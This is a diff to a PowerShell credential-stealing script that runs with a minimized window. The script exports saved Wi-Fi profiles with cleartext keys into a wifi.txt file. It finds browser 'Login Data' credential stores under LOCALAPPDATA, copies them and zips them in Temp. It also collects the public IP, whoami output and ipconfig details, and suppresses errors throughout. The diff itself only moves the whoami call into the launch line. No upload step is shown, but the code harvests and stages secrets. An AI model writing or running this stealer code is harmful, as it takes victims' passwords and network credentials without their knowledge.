@@ -1,5 +1,5 @@
 
-powershell -windowstyle minimized
+powershell -windowstyle minimized -command "$whoami_content = whoami"
 
 
 $e="$env:LOCALAPPDATA\Temp"; netsh wlan export profile key=clear folder=$e | Out-Null; Get-ChildItem "$e\Wi-Fi*.xml" | %{$x=[xml](gc $_); "SSID:$($x.WLANProfile.SSIDConfig.SSID.name) | Password:$($x.WLANProfile.MSM.security.sharedKey.keyMaterial)"} > "$e\wifi.txt"
@@ -8,7 +8,7 @@ $e="$env:LOCALAPPDATA\Temp"; netsh wlan export profile key=clear folder=$e | Out
 $zip="$env:LOCALAPPDATA\Temp\LoginDataBackup.zip";$tempDir=Join-Path $env:LOCALAPPDATA "Temp\LoginDataTemp";Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue;New-Item -Path $tempDir -ItemType Directory -Force|Out-Null;Get-ChildItem $env:LOCALAPPDATA -Filter "Login Data" -Recurse -Force -ErrorAction SilentlyContinue|ForEach-Object{$p=Split-Path $_.FullName -Parent;$gp=Split-Path $p -Parent;if((Split-Path $gp -Leaf)-ieq"User Data"){$vendor=Split-Path (Split-Path $gp -Parent) -Leaf;$profile=Split-Path $p -Leaf;$label="$vendor-$profile-LoginData";Copy-Item $_.FullName (Join-Path $tempDir $label) -Force -ErrorAction SilentlyContinue}};if(Test-Path $zip){Remove-Item $zip -Force};if(Get-ChildItem $tempDir){Compress-Archive -Path (Join-Path $tempDir '*') -DestinationPath $zip -Force};Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
 
 $ip_add = try{(Invoke-RestMethod "https://api.ipify.org?format=json" -ErrorAction Stop).ip}catch{""}
-$whoami_content = whoami
+
 
 
 ipconfig /all | Out-File -FilePath "$e\ipcfg.txt" # save ipconfig as a file
